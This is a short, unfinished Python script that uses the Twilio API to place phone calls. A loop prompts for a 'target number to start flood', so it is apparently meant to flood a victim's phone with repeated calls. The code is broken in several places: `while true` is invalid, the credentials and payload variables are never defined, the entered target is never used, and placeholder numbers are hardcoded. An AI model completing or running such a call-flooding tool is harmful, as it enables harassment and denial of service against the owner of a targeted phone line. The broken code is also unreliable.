#!/usr/bin/env python3

from twilio.rest import Client
# reference: https://github.com/twilio/twilio-python/
import settings.default
import settings.local


# Check initialization:
    # Not using default twilio account
    # a target has been provided


client = Client(accountSid, authtoken)

call = client.calls.create(to="9991231234",
                           from_="9991231234",
                           url=twilioXMLPayload)
print(call.sid)


def makecalls():
    while true:
            # Ask the user for a phone number to target:
        target = input('Enter the target number to start flood (+1 MUST BE IN FRONT!):')
        new_call = client.calls.create(to='XXXX', from_='YYYY', method='GET')

if __name__ == '__main__':
    makecalls()
